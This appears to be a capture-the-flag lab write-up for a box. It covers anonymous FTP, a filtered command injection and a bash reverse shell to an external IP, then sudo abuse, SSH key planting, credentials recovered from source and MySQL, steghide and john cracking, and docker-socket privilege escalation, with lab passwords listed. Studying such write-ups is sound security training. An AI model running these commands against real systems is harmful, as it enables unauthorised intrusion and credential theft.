# Info
## Credentials
- Anurodh:!d0ntKn0wmYp@ssw0rd
- Apaar
- aurick:masterpassword
- cullapaar:dontaskdonttell


## FTP
- note.txt
	- Get two possible username `Apaar` and `Anurodh`

## Web Server
- `/secret` has command injection with filter

# Path
## User
1. Get `note.txt` from ftp anonymous
2. Found `/secret` has cmdi, then write the script `cmd.py` to test it.
3. Get .php to bypass the filter and get shell 
```
python3 cmd.py "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.4.209/13337 0>&1'"
```
4. `www-data` can run sudo as `appar` against `/home/apaar/.helpline.sh`. So use it to become apaar and get user flag
```
www-data$ sudo -l
www-data$ sudo -u apaar /home/apaar/.helpline.sh
AAAA
/bin/bash

apaar$ echo <my public key> >> /home/apaar/.ssh/authorized.keys
$ ssh apaar@10.10.127.60
```
## Root
5. Found MySQL running and there's credential in `/var/www/files/index.php`.
``
   $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```
6. Get the credentials from MySQL (password is md5 hash, according to account.php)
```
mysql> select * from users
    -> ;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```
7. Because the file `/var/www/files/hacker.php` reads `Look into the dark`, so downloads images from `/var/www/files/images` and look into it.
```
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase:
wrote extracted data to "backup.zip".
$ /opt/john/run/zip2john backup.zip > backup.john
$ john backup.john --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
```
8. In the source_code.php, we found another password `!d0ntKn0wmYp@ssw0rd`, and it is belong's to anurodh.
9. Run linpeas.sh, and it shows we can write to docker socket.
10. According to GTFOBins, use following command to become root, then get root flag.
```
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
``
